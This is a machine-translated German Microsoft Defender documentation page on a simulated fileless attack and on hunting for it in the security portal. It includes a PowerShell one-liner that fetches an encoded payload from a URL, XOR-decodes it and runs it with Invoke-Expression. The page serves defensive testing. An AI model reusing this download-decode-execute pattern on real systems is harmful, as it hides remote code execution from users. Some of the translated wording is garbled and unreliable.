---
title: Ausführen ihrer Microsoft 365 Defender-Angriffssimulationen
description: Führen Sie Angriffssimulationen für Ihr Microsoft 365 Defender-Pilotprojekt aus, um zu sehen, wie es sich entwickelt und schnell behoben wird.
keywords: Microsoft Threat Protection– Pilotangriffssimulation, Ausführen der Microsoft Threat Protection-Pilotangriffssimulation, Simulieren von Angriffen in Microsoft Threat Protection, Microsoft Threat Protection-Pilotprojekt, Cybersicherheit, erweiterte dauerhafte Bedrohung, Unternehmenssicherheit, Geräte, Gerät, Identität, Benutzer, Daten, Anwendungen, Vorfälle, automatisierte Untersuchung und Wartung, erweiterte Suche
search.product: eADQiWindows 10XVcnh
search.appverid: met150
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: dolmont
author: DulceMontemayor
ms.localizationpriority: medium
manager: dansimp
audience: ITPro
ms.collection:
- M365-security-compliance
- m365solution-scenario
- m365solution-pilotmtpproject
ms.topic: conceptual
ms.technology: m365d
ms.openlocfilehash: f1714eeeb30d1dd4c209d063604e1031369b5ddb
ms.sourcegitcommit: 855719ee21017cf87dfa98cbe62806763bcb78ac
ms.translationtype: MT
ms.contentlocale: de-DE
ms.lasthandoff: 01/22/2021
ms.locfileid: "49933054"
---
# <a name="run-your-microsoft-365-defender-attack-simulations"></a>Ausführen ihrer Microsoft 365 Defender-Angriffssimulationen

[!INCLUDE [Microsoft 365 Defender rebranding](../includes/microsoft-defender.md)]


|[![Planung](../../media/phase-diagrams/1-planning.png)](mtp-pilot-plan.md)<br/>[Planung](mtp-pilot-plan.md)|[![Vorbereiten](../../media/phase-diagrams/2-prepare.png)](prepare-mtpeval.md)<br/>[Vorbereitung](prepare-mtpeval.md)|![Angriff simulieren](../../media/phase-diagrams/3-simluate.png)<br/>Angriff simulieren|[![Schließen und zusammenfassen](../../media/phase-diagrams/4-summary.png)](mtp-pilot-close.md)<br/>[Schließen und zusammenfassen](mtp-pilot-close.md)|
|--|--|--|--|
|||*Sie sind hier!*||

Sie sind derzeit in der Angriffssimulationsphase.

Nach der Vorbereitung Ihrer Pilotumgebung ist es an der Zeit, die Microsoft 365 Defender Incident Management- und automatisierten Untersuchungs- und Wartungsfunktionen zu testen. Wir helfen Ihnen bei der Simulation eines ausgeklügelten Angriffs, der erweiterte Techniken nutzt, um sich vor der Erkennung auszublenden. Der Angriff listet geöffnete Server Message Block (SMB)-Sitzungen auf Domänencontrollern auf und ruft aktuelle IP-Adressen der Geräte der Benutzer ab. Diese Kategorie von Angriffen umfasst in der Regel keine Dateien, die auf dem Gerät des Opfers abgelegt wurden, sondern nur im Arbeitsspeicher. Sie "live off the land" by using existing system and administrative tools and inject their code into system processes to hide their execution, Such behavior allows them to evade detection and persist on the device.

In dieser Simulation beginnt unser Beispielszenario mit einem PowerShell-Skript. Ein Benutzer wird möglicherweise zum Ausführen eines Skripts vertiffen. Oder das Skript kann von einer Remoteverbindung mit einem anderen Computer von einem zuvor infizierten Gerät ausgeführt werden – dem Angreifer, der versucht, sich im Netzwerk lateral zu bewegen. Die Erkennung dieser Skripts kann schwierig sein, da Administratoren skripts häufig auch remote ausführen, um verschiedene administrative Aktivitäten auszuführen.

![Fileless PowerShell attack with process injection and SMB reconnaisance attack diagram](../../media/mtp/mtpdiydiagram.png)

Während der Simulation injiziert der Angriff Shellcode in einen scheinbar ungernen Prozess. Das Szenario erfordert die Verwendung von notepad.exe. Wir haben diesen Prozess für die Simulation ausgewählt, aber Angreifer würden eher auf einen lange dauernden Systemprozess wie svchost.exe. Der Shellcode kontaktiert dann den Befehls- und Steuerungsserver (C2) des Angreifers, um Anweisungen zum Fortfahren zu erhalten. Das Skript versucht, Rekonnaissanceabfragen für den Domänencontroller (DC) auszuführen. Die Rekonnaissance ermöglicht es einem Angreifer, Informationen zu den aktuellen Benutzeranmeldeinformationen zu erhalten. Sobald Angreifer über diese Informationen verfügen, können sie sich lateral im Netzwerk bewegen, um zu einem bestimmten vertraulichen Konto zu wechseln.

> [!IMPORTANT]
> Befolgen Sie für optimale Ergebnisse die Anweisungen zur Angriffssimulation so genau wie möglich.

## <a name="simulation-environment-requirements"></a>Anforderungen an die Simulationsumgebung

Da Sie Ihre Pilotumgebung bereits während der Vorbereitungsphase konfiguriert haben, stellen Sie sicher, dass Sie über zwei Geräte für dieses Szenario verfügen: ein Testgerät und einen Domänencontroller.

1. Überprüfen Sie, ob Ihr [Mandant Microsoft 365 Defender aktiviert hat.](https://docs.microsoft.com/microsoft-365/security/mtp/mtp-enable#starting-the-service)

2. Überprüfen Sie die Konfiguration des Testdomänencontrollers:

   - Das Gerät wird mit Windows Server 2008 R2 oder einer neueren Version ausgeführt.
   - Testen Sie den Domänencontroller [für Microsoft Defender for Identity,](https://docs.microsoft.com/azure/security-center/security-center-wdatp) und aktivieren Sie die [Remoteverwaltung.](https://docs.microsoft.com/windows-server/administration/server-manager/configure-remote-management-in-server-manager)
   - Stellen Sie sicher, dass die [Integration von Microsoft Defender for Identity und Microsoft Cloud App Security](https://docs.microsoft.com/cloud-app-security/mdi-integration) aktiviert wurde.
   - Ein Testbenutzer wird in Ihrer Domäne erstellt – es sind keine Administratorberechtigungen erforderlich.

3. Überprüfen sie die Konfiguration des Testgeräts:

   1. Das Gerät wird mit Windows 10, Version 1903 oder höher, ausgeführt.

   1. Das Testgerät ist der Testdomäne beigetreten.

   1. [Aktivieren Sie Windows Defender Antivirus](https://docs.microsoft.com/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features). Wenn Sie Probleme beim Aktivieren von Windows Defender Antivirus haben, lesen Sie dieses [Problembehandlungsthema.](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy)

   1. Stellen Sie sicher, dass das Testgerät [in Microsoft Defender for Endpoint onboarded ist.](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints)

Wenn Sie einen vorhandenen Mandanten verwenden und Gerätegruppen implementieren, erstellen Sie eine dedizierte Gerätegruppe für das Testgerät, und übertragen Sie sie in der Konfigurations-UX auf die oberste Ebene.

## <a name="run-the-attack-scenario-simulation"></a>Ausführen der Simulation des Angriffsszenarios

So führen Sie die Simulation des Angriffsszenarios aus:

1. Melden Sie sich mit dem Testbenutzerkonto am Testgerät an.

2. Öffnen Sie Windows PowerShell Fenster auf dem Testgerät.

3. Kopieren Sie das folgende Simulationsskript:

   ```powershell
   [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor
   = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI "https://winatpmanagement.windows.com/client/management/static/MTP_Fileless_Recon.txt"
   -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
   $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
   $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
   ```

   > [!NOTE]
   > Wenn Sie dieses Dokument in einem Webbrowser öffnen, können Probleme beim Kopieren des Volltexts auftreten, ohne bestimmte Zeichen zu verlieren oder zusätzliche Zeilenumbrüche zu verursachen. Laden Sie dieses Dokument herunter, und öffnen Sie es in Adobe Reader.

4. Fügen Sie an der Eingabeaufforderung das kopierte Skript ein, und führen Sie es aus.

> [!NOTE]
> Wenn Sie PowerShell mithilfe des Remotedesktopprotokolls (RDP) ausführen, verwenden Sie den Befehl "Text der Zwischenablage eingeben" im RDP-Client, da die **Strg-V-Hotkey-** oder Rechtsklick-Einfügemethode möglicherweise nicht funktioniert. Aktuelle Versionen von PowerShell akzeptieren diese Methode manchmal auch nicht. Möglicherweise müssen Sie zuerst in Editor im Arbeitsspeicher kopieren, auf dem virtuellen Computer kopieren und dann in PowerShell einfügen.

Einige Sekunden später wird <i>notepad.exe</i> geöffnet. Ein simulierter Angriffscode wird in die notepad.exe. Lassen Sie die automatisch generierte Editorinstanz geöffnet, um das vollständige Szenario zu erleben.

Der simulierte Angriffscode versucht, mit einer externen #A0 zu kommunizieren (der C2-Server wird simuliert), und dann wird versucht, die Verbindung über SMB mit dem Domänencontroller zu rekonnaisieren.

Wenn dieses Skript abgeschlossen ist, wird eine Meldung in der PowerShell-Konsole angezeigt.

```console
ran NetSessionEnum against [DC Name] with return code result 0
```

Um das Feature "Automatisierter Vorfall und Reaktion" in Aktion zu sehen, lassen Sie notepad.exe geöffnet. You'll see Automated Incident and Response stop the Notepad process.

## <a name="investigate-an-incident"></a>Untersuchung eines Vorfalls

> [!NOTE]
> Bevor wir Sie durch diese Simulation bringen, sehen Sie sich das folgende Video an, um zu sehen, wie Sie bei der Vorfallverwaltung die zugehörigen Warnungen im Rahmen des Untersuchungsprozesses zusammenbringen, wo Sie sie im Portal finden und wie sie Ihnen bei Ihren Sicherheitsvorgängen helfen können:

> [!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bzwz?]

Um zum SoC-Analysten zu wechseln, können Sie jetzt beginnen, den Angriff im Microsoft 365 Security Center-Portal zu untersuchen.

1. Öffnen Sie die [Microsoft 365 Security](https://security.microsoft.com/incidents) Center-Portal-Vorfallwarteschlange von einem beliebigen Gerät aus.

2. Navigieren Sie **im Menü zu** "Vorfälle".

    ![Screenshot von Vorfällen, wie im linken Menü des Microsoft 365 Security Center dargestellt](../../media/mtp/fig1.png)

3. Der neue Vorfall für den simulierten Angriff wird in der Vorfallwarteschlange angezeigt.

    ![Screenshot der Vorfallwarteschlange](../../media/mtp/fig2.png)

### <a name="investigate-the-attack-as-a-single-incident"></a>Untersuchen des Angriffs als einzelner Vorfall

Microsoft 365 Defender korreliert Analysen und aggregiert alle zugehörigen Warnungen und Untersuchungen aus verschiedenen Produkten in einer Vorfalleinheit. Dadurch zeigt Microsoft 365 Defender eine umfassendere Angriffsgeschichte, sodass der SOC-Analyst komplexe Bedrohungen verstehen und darauf reagieren kann.

Die während dieser Simulation generierten Warnungen sind derselben Bedrohung zugeordnet und werden daher automatisch als einzelner Vorfall aggregiert.

So zeigen Sie den Vorfall an

1. Navigieren Sie zur **Vorfallwarteschlange.**

   ![Screenshot von Vorfällen aus dem Navigationsmenü](../../media/mtp/fig1.png)

2. Wählen Sie das neueste Element aus, indem Sie auf den Kreis klicken, der sich links neben dem Vorfallnamen befindet. In einem Seitenbereich werden zusätzliche Informationen zu dem Vorfall angezeigt, einschließlich aller zugehörigen Warnungen. Jeder Vorfall hat einen eindeutigen Namen, der ihn basierend auf den Attributen der Warnungen beschreibt, die er enthält.

   ![Screenshot der Vorfallseite, auf der generierte Warnungen während der Simulation aggregiert werden](../../media/mtp/fig4.png)

   Die im Dashboard angezeigten Warnungen können basierend auf Dienstressourcen gefiltert werden: Microsoft Defender for Identity, Microsoft Cloud App Security, Microsoft Defender for Endpoint, Microsoft 365 Defender und Microsoft Defender für Office 365.

3. Wählen **Sie die Seite "Vorfall öffnen"** aus, um weitere Informationen zu dem Vorfall zu erhalten.

   Auf der **Seite** "Vorfall" werden alle Warnungen und Informationen zu dem Vorfall angezeigt. Die Informationen umfassen die Entitäten und Ressourcen, die an der Warnung beteiligt sind, die Erkennungsquelle der Warnungen (Microsoft Defender for Identity, EDR) und den Grund, warum sie miteinander verknüpft wurden. Die Überprüfung der Warnungsliste für Vorfälle zeigt den Verlauf des Angriffs an. In dieser Ansicht können Sie die einzelnen Warnungen anzeigen und untersuchen.

   Sie können auch **im** rechten Menü auf "Vorfall verwalten" klicken, um den Vorfall zu markieren, ihn sich selbst zuzuordnen und Kommentare hinzuzufügen.

   ![Screenshot der Stelle, an der Sie auf "Vorfall verwalten" klicken](../../media/mtp/fig5a.png)

   ![Screenshot of the fields on the manage incident panel where you can tag the incident, assign it to yourself, and add comments ](../../media/mtp/fig5b.png)

### <a name="review-generated-alerts"></a>Überprüfen generierter Warnungen

Sehen wir uns einige der Warnungen an, die während des simulierten Angriffs generiert wurden.

> [!NOTE]
> Wir werden nur einige der während des simulierten Angriffs generierten Warnungen durch die Warnungen durch gehen. Abhängig von der Version von Windows und den auf Ihrem Testgerät ausgeführten Microsoft 365 Defender-Produkten werden möglicherweise weitere Warnungen angezeigt, die in einer etwas anderen Reihenfolge angezeigt werden.

![Screenshot der generierten Warnungen](../../media/mtp/fig6.png)

#### <a name="alert-suspicious-process-injection-observed-source-microsoft-defender-for-endpoint-edr"></a>Warnung: Verdächtige Prozessinjektion beobachtet (Quelle: Microsoft Defender für Endpunkt-EDR)

Erfahrene Angreifer verwenden ausgefeilte und stehlende Methoden, um im Arbeitsspeicher zu bleiben und sich vor Erkennungstools auszublenden. Eine gängige Technik besteht in der Ausführung innerhalb eines vertrauenswürdigen Systemprozesses und nicht in einer schädlichen ausführbaren Datei, was es für Erkennungstools und Sicherheitsvorgänge schwierig macht, den schädlichen Code zu erkennen.

Um es den SOC-Analysten zu ermöglichen, diese erweiterten Angriffe zu erfassen, bieten Tiefenspeichersensoren in Microsoft Defender for Endpoint unserem Clouddienst einen einzigartigen Einblick in eine Vielzahl prozessübergreifender Codeinjektionstechniken. Die folgende Abbildung zeigt, wie Defender for Endpoint bei dem <i> </i>Versuch, Code in dienotepad.exe.

![Screenshot der Warnung zur Einfeindung von potenziell schädlichem Code](../../media/mtp/fig7.png)

#### <a name="alert-unexpected-behavior-observed-by-a-process-run-with-no-command-line-arguments-source-microsoft-defender-for-endpoint-edr"></a>Warnung: Unerwartetes Verhalten, das von einem Prozess ohne Befehlszeilenargumente beobachtet wird (Quelle: Microsoft Defender für Endpunkt-EDR)

Microsoft Defender für Endpunkterkennungen zielen häufig auf das am häufigsten verwendeten Attribut einer Angriffstechnik ab. Diese Methode stellt Sicherheit sicher und löst die Leiste für Angreifer aus, um zu neueren Taktiken zu wechseln.

Wir verwenden umfangreiche Lernalgorithmen, um das normale Verhalten gängiger Prozesse innerhalb einer Organisation und weltweit zu erstellen und zu beobachten, ob diese Prozesse anomales Verhalten zeigen. Diese anomalen Verhaltensweisen weisen häufig darauf hin, dass überflüssiger Code eingeführt wurde und in einem ansonsten vertrauenswürdigen Prozess ausgeführt wird.

In diesem Szenario weist der Prozess <i>notepad.exe</i> anormales Verhalten auf, bei dem die Kommunikation mit einem externen Standort beteiligt ist. Dieses Ergebnis ist unabhängig von der spezifischen Methode, die zum Einführen und Ausführen des schädlichen Codes verwendet wird.

> [!NOTE]
> Da diese Warnung auf Machine Learning-Modellen basiert, die eine zusätzliche Back-End-Verarbeitung erfordern, kann es einige Zeit dauern, bis diese Warnung im Portal angezeigt wird.

Beachten Sie, dass die Warnungsdetails die externe IP-Adresse enthalten– ein Indikator, den Sie als Pivot verwenden können, um die Untersuchung zu erweitern.

Wählen Sie die IP-Adresse in der Warnungsprozessstruktur aus, um die Seite mit den Details der IP-Adresse anzuzeigen.

![Screenshot der Warnung für unerwartetes Verhalten durch einen Prozess, der ohne Befehlszeilenargumente ausgeführt wird](../../media/mtp/fig8.png)

In der folgenden Abbildung wird die ausgewählte Seite "IP-Adressdetails" angezeigt (klicken Sie in der Struktur des Warnungsprozesses auf die IP-Adresse).
![Screenshot der Seite "IP-Adressdetails"](../../media/mtp/fig9.png)

#### <a name="alert-user-and-ip-address-reconnaissance-smb-source-microsoft-defender-for-identity"></a>Warnung: Benutzer- und IP-Adress-Reconnaissance (SMB) (Quelle: Microsoft Defender for Identity)

Die Enumeration mithilfe des Server Message Block (SMB)-Protokolls ermöglicht Angreifern das Erhalten aktueller Benutzeranmeldeinformationen, die ihnen helfen, sich lateral durch das Netzwerk zu bewegen, um auf ein bestimmtes vertrauliches Konto zu zugreifen.

Bei dieser Erkennung wird eine Warnung ausgelöst, wenn die Aufzählung der SMB-Sitzung für einen Domänencontroller ausgeführt wird.

![Screenshot der Microsoft Defender for Identity-Warnung für die Benutzer- und IP-Adress-Reconnaissance](../../media/mtp/fig10.png)

### <a name="review-the-device-timeline-microsoft-defender-for-endpoint"></a>Überprüfen der Gerätezeitachse [Microsoft Defender for Endpoint]

Nachdem Sie die verschiedenen Warnungen in diesem Vorfall untersucht haben, navigieren Sie zurück zu der Vorfallseite, die Sie zuvor untersucht haben. Wählen Sie **die Registerkarte** "Geräte" auf der Vorfallseite aus, um die an diesem Vorfall beteiligten Geräte zu überprüfen, wie von Microsoft Defender for Endpoint und Microsoft Defender for Identity gemeldet.

Wählen Sie den Namen des Geräts aus, auf dem der Angriff durchgeführt wurde, um die Entitätsseite für dieses bestimmte Gerät zu öffnen. Auf dieser Seite sehen Sie Warnungen, die ausgelöst wurden, und zugehörige Ereignisse.

Wählen Sie **die Registerkarte "Zeitachse"** aus, um die Gerätezeitachse zu öffnen und alle auf dem Gerät beobachteten Ereignisse und Verhaltensweisen in chronologischer Reihenfolge anzuzeigen, die mit den ausgelösten Warnungen inspersiert sind.

![Screenshot der Gerätezeitachse mit Verhaltensweisen](../../media/mtp/fig11.png)

Das Erweitern einiger der interessanteren Verhaltensweisen liefert nützliche Details, z. B. Prozessstrukturen.

Führen Sie beispielsweise einen Bildlauf nach unten durch, bis Sie das Warnungsereignis **"Verdächtige Prozesseinfeindung" festgestellt haben.** Wählen Siepowershell.exe aus, der in das **darunter notepad.exe** wird, um die vollständige Prozessstruktur  für dieses Verhalten unter dem Diagramm "Ereignisentitäten" im Seitenbereich anzuzeigen. Verwenden Sie bei Bedarf die Suchleiste zum Filtern.

![Screenshot der Prozessstruktur für das ausgewählte PowerShell-Dateierstellungsverhalten](../../media/mtp/fig12.png)

### <a name="review-the-user-information-microsoft-cloud-app-security"></a>Überprüfen der Benutzerinformationen [Microsoft Cloud App Security]

Wählen Sie auf der  Seite "Vorfall" die Registerkarte "Benutzer" aus, um die Liste der an dem Angriff beteiligten Benutzer anzeigen zu können. Die Tabelle enthält zusätzliche Informationen zu jedem  Benutzer, einschließlich der Untersuchungspriorität der einzelnen Benutzer.

Wählen Sie den Benutzernamen aus, um die Profilseite des Benutzers zu öffnen, auf der weitere Untersuchungen durchgeführt werden können. [Erfahren Sie mehr über die Untersuchung riskanter Benutzer.](https://docs.microsoft.com/cloud-app-security/tutorial-ueba#identify)

![Screenshot der Cloud App Security-Benutzerseite](../../media/mtp/fig13.png)

## <a name="automated-investigation-and-remediation"></a>Automatische Untersuchung und Reaktion

> [!NOTE]
>Bevor wir Sie durch diese Simulation bringen, sehen Sie sich das folgende Video an, um sich damit vertraut zu machen, was automatisierte Selbstrehierung ist, wo sie im Portal zu finden ist und wie sie bei Ihren Sicherheitsvorgängen hilfreich sein kann:

> [!VIDEO https://www.microsoft.com/en-us/videoplayer/embed/RE4BzwB]

Navigieren Sie zurück zu dem Vorfall im Microsoft 365 Security Center-Portal. Auf **der Registerkarte** "Untersuchungen" auf der Seite **"Vorfall"** werden die automatisierten Untersuchungen angezeigt, die von Microsoft Defender for Identity und Microsoft Defender for Endpoint ausgelöst wurden. Der folgende Screenshot zeigt nur die automatisierte Untersuchung an, die von Defender for Endpoint ausgelöst wurde. Standardmäßig werden von Defender for Endpoint die in der Warteschlange gefundenen Artefakte automatisch behoben, was eine Korrektur erfordert.

![Screenshot der automatisierten Untersuchungen im Zusammenhang mit dem Vorfall](../../media/mtp/fig14.png)

Wählen Sie die Warnung aus, die eine Untersuchung ausgelöst hat, um die Seite **"Untersuchungsdetails" zu** öffnen. Es werden die folgenden Details zu sehen sein:

- Warnung(en), die die automatisierte Untersuchung ausgelöst hat.
- Betroffener Benutzer und Geräte. Wenn Indikatoren auf zusätzlichen Geräten gefunden werden, werden diese zusätzlichen Geräte ebenfalls aufgelistet.
- Liste der Nachweise. Die gefundenen und analysierten Entitäten, z. B. Dateien, Prozesse, Dienste, Treiber und Netzwerkadressen. Diese Entitäten werden auf mögliche Beziehungen zu der Warnung analysiert und als gutartig oder bösartig bewertet.
- Bedrohungen gefunden. Bekannte Bedrohungen, die während der Untersuchung gefunden werden.

> [!NOTE]
> Je nach Zeitpunkt wird die automatisierte Untersuchung möglicherweise noch ausgeführt. Warten Sie einige Minuten, bis der Prozess abgeschlossen ist, bevor Sie die Nachweise sammeln und analysieren und die Ergebnisse überprüfen. Aktualisieren Sie die **Seite "Untersuchungsdetails",** um die neuesten Ergebnisse zu erhalten.

![Screenshot der Seite "Untersuchungsdetails"](../../media/mtp/fig15.png)

Während der automatisierten Untersuchung identifizierte Microsoft Defender for Endpoint den notepad.exe Prozess, der als eines der Artefakte, die eine Korrektur erfordern, injiziert wurde. Defender for Endpoint stoppt die verdächtige Prozesseinfeindung automatisch als Teil der automatisierten Korrektur.

Sie können <i> sehennotepad.exe</i> aus der Liste der ausgeführten Prozesse auf dem Testgerät nicht mehr angezeigt wird.

## <a name="resolve-the-incident"></a>Beheben des Vorfalls

Schließen Sie den Vorfall, nachdem die Untersuchung abgeschlossen und bestätigt wurde, dass sie behoben wurde.

Wählen Sie **"Vorfall verwalten" aus.** Legen Sie den Status auf **"Vorfall beheben"** und wählen Sie die entsprechende Klassifizierung aus.

Wenn der Vorfall behoben wird, werden alle zugehörigen Warnungen im Microsoft 365 Security Center und in den zugehörigen Portalen geschlossen.

![Screenshot der Seite "Vorfälle" mit dem geöffneten Bereich "Vorfall verwalten", auf der Sie auf die Option zum Beheben des Vorfalls klicken können](../../media/mtp/fig16.png)

Dies schließt die Angriffssimulation für die Vorfallverwaltung und automatisierte Untersuchungs- und Wartungsszenarien ein. Die nächste Simulation nimmt Sie durch die proaktive Bedrohungssuche nach potenziell schädlichen Dateien.

## <a name="advanced-hunting-scenario"></a>Szenario "Erweiterte Suche"

> [!NOTE]
> Bevor wir Sie durch die Simulation gehen, sehen Sie sich das folgende Video an, um die Konzepte der erweiterten Suche zu verstehen, zu sehen, wo Sie es im Portal finden können, und wie es Ihnen bei Ihren Sicherheitsvorgängen helfen kann:

> [!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bp7O]

### <a name="hunting-environment-requirements"></a>Umgebungsanforderungen für die Suche

Für dieses Szenario ist ein einzelnes internes Postfach und Gerät erforderlich. Sie benötigen auch ein externes E-Mail-Konto, um die Testnachricht zu senden.

1. Stellen Sie sicher, dass Ihr [Mandant Microsoft 365 Defender aktiviert hat.](https://docs.microsoft.com/microsoft-365/security/mtp/mtp-enable#starting-the-service)
2. Identifizieren Sie ein Zielpostfach, das für den Empfang von E-Mails verwendet werden soll.
    a. Dieses Postfach muss von Microsoft Defender für Office 365 b überwacht werden. Das Gerät aus Anforderung 3 muss auf dieses Postfach zugreifen
3. Konfigurieren eines Testgeräts: a. Stellen Sie sicher, dass Sie Windows 10, Version 1903 oder höher, verwenden.
    b. Verbinden Sie das Testgerät mit der Testdomäne.
    c. [Aktivieren Sie Windows Defender Antivirus](https://docs.microsoft.com/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features). Wenn Sie Probleme beim Aktivieren von Windows Defender Antivirus haben, lesen Sie [dieses Problembehandlungsthema.](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy)
    d. [Onboarding in Microsoft Defender for Endpoint](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).

### <a name="run-the-simulation"></a>Ausführen der Simulation

1. Senden Sie von einem externen E-Mail-Konto eine E-Mail an das Postfach, das in Schritt 2 des Abschnitts "Anforderungen an die Testumgebung" identifiziert wurde. Fügen Sie eine Anlage ein, die über vorhandene E-Mail-Filterrichtlinien zulässig ist. Diese Datei muss weder schädlich noch ausführbar sein. Vorgeschlagene Dateitypen sind <i>PDF,</i> <i>EXE</i> (sofern zulässig) oder Office-Dokument, z. B. eine Word-Datei.
2. Öffnen Sie die gesendete E-Mail von dem Gerät, das gemäß der Definition in Schritt 3 des Abschnitts mit den Anforderungen für die Testumgebung konfiguriert ist. Öffnen Sie die Anlage, oder speichern Sie die Datei auf dem Gerät.

#### <a name="go-hunting"></a>Auf Suche gehen

1. Öffnen Sie das security.microsoft.com Portal.

2. Navigieren Sie zu **"Suche > Erweiterte Suche".**

   ![Screenshot der erweiterten Suche in der Navigationsleiste des M365 Security Center-Portals](../../media/mtp/fig17.png)

3. Erstellen Sie eine Abfrage, die mit dem Sammeln von E-Mail-Ereignissen beginnt.

   1. Wählen Sie im Abfragebereich "Neu" aus.

   1. Doppelklicken Sie im Schema auf die Tabelle "EmailEvents".

      ```console
      EmailEvents
      ```

   1. Ändern Sie den Zeitrahmen in die letzten 24 Stunden. Angenommen, die E-Mail, die Sie beim Ausführen der obigen Simulation gesendet haben, lag in den letzten 24 Stunden, andernfalls ändern Sie den Zeitrahmen.

      ![Screenshot des Orts, an dem Sie den Zeitrahmen ändern können. Öffnen Sie das Dropdownmenü, um eine Auswahl aus einem Bereich von Zeitrahmenoptionen zu wählen.](../../media/mtp/fig18.png)

   1. Führen Sie die Abfrage aus. Je nach Umgebung für das Pilotprojekt können zahlreiche Ergebnisse erzielt werden.

      > [!NOTE]
      > Im nächsten Schritt finden Sie Filteroptionen zum Einschränken der Datenrücklaufoptionen.

      ![Screenshot der Abfrageergebnisse für die erweiterte Suche](../../media/mtp/fig19.png)

        > [!NOTE]
        > Bei der erweiterten Suche werden Abfrageergebnisse als tabellarische Daten angezeigt. Sie können die Daten auch in anderen Formattypen wie Diagrammen anzeigen.

   1. Sehen Sie sich die Ergebnisse an, und sehen Sie, ob Sie die geöffnete E-Mail identifizieren können. Es kann bis zu zwei Stunden dauern, bis die Nachricht bei der erweiterten Suche angezeigt wird. Wenn die E-Mail-Umgebung groß ist und zahlreiche  Ergebnisse verfügbar sind, sollten Sie die Option "Filter anzeigen" verwenden, um die Nachricht zu finden.

      Im Beispiel wurde die E-Mail von einem Yahoo-Konto gesendet. Klicken Sie auf das Symbol neben yahoo.com im Abschnitt **+**  "SenderFromDomain", und klicken Sie dann auf  "Übernehmen", um die ausgewählte Domäne der Abfrage hinzuzufügen. Verwenden Sie die Domäne oder das E-Mail-Konto, das zum Senden der Testnachricht in Schritt 1 von "Simulation ausführen" verwendet wurde, um Ihre Ergebnisse zu filtern. Führen Sie die Abfrage erneut aus, um ein kleineres Ergebnisset zu erhalten, um sicherzustellen, dass die Meldung aus der Simulation angezeigt wird.

      ![Screenshot der Filter. Verwenden Sie Filter, um die Suche zu einent- und schneller zu finden, was Sie suchen.](../../media/mtp/fig20.png)

      ```console
      EmailEvents
      | where SenderMailFromDomain == "yahoo.com"
      ```

   1. Klicken Sie auf die resultierenden Zeilen aus der Abfrage, damit Sie den Datensatz überprüfen können.

      ![Screenshot des Seitenbereichs "Überprüfen des Datensatzes", der geöffnet wird, wenn ein erweitertes Ergebnis für die Suche ausgewählt wird](../../media/mtp/fig21.png)

4. Nachdem Sie nun überprüft haben, dass die E-Mail angezeigt wird, fügen Sie einen Filter für die Anlagen hinzu. Konzentrieren Sie sich auf alle E-Mails mit Anlagen in der Umgebung. Konzentrieren Sie sich in diesem Szenario auf eingehende E-Mails, nicht auf E-Mails, die von Ihrer Umgebung gesendet werden. Entfernen Sie alle Filter, die Sie hinzugefügt haben, um ihre Nachricht zu finden, und fügen Sie "| wobei **AttachmentCount > 0 und** **EmailDirection**  ==  **"Inbound"**

   Die folgende Abfrage zeigt Ihnen das Ergebnis mit einer kürzeren Liste als die ursprüngliche Abfrage für alle E-Mail-Ereignisse:

   ```console
   EmailEvents
   | where AttachmentCount > 0 and EmailDirection == "Inbound"
   ```

5. Fügen Sie als Nächstes die Informationen zur Anlage (z. B. Dateiname, Hashes) zu Ihrem Ergebnissatz ein. Schließen Sie dazu die Tabelle **"EmailAttachmentInfo"** an. Die gängigen Felder für die Teilnahme sind in diesem Fall **NetworkMessageId** und **RecipientObjectId**.

   Die folgende Abfrage enthält auch eine zusätzliche Zeile "| **project-rename EmailTimestamp=Timestamp**", mit dem identifiziert werden kann, welcher Zeitstempel mit der E-Mail im Vergleich zu Zeitstempeln im Zusammenhang mit Dateiaktionen im Zusammenhang stand, die Sie im nächsten Schritt hinzufügen.

   ```console
   EmailEvents
   | where AttachmentCount > 0 and EmailDirection == "Inbound"
   | project-rename EmailTimestamp=Timestamp
   | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
   ```

6. Verwenden Sie als Nächstes den **#A0** aus der **Tabelle "EmailAttachmentInfo",** um **DeviceFileEvents** (Dateiaktionen, die auf dem Endpunkt passiert sind) für diesen Hash zu finden. Das allgemeine Feld hier ist der #A0 für die Anlage.

   Die resultierende Tabelle enthält nun Details vom Endpunkt (Microsoft Defender für Endpunkt), z. B. gerätename, welche Aktion durchgeführt wurde (in diesem Fall gefiltert, um nur FileCreated-Ereignisse zu enthalten) und wo die Datei gespeichert wurde. Der dem Prozess zugeordnete Kontoname wird ebenfalls eingeschlossen.

   ```console
   EmailEvents
   | where AttachmentCount > 0 and EmailDirection == "Inbound"
   | project-rename EmailTimestamp=Timestamp
   | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
   | join DeviceFileEvents on SHA256
   | where ActionType == "FileCreated"
   ```

   Sie haben nun eine Abfrage erstellt, die alle eingehenden E-Mails identifiziert, in denen der Benutzer die Anlage geöffnet oder gespeichert hat. Sie können diese Abfrage auch verfeinern, um nach bestimmten Absenderdomänen, Dateigrößen, Dateitypen und so weiter zu filtern.

7. Funktionen sind eine besondere Art von Verknüpfung, mit der Sie mehr DATEN über eine Datei wie Verbreitung, Signier- und Ausstellerinformationen usw. erhalten können. Um weitere Details zur Datei zu erhalten, verwenden Sie die **FileProfile()-Funktionerweiterung:**

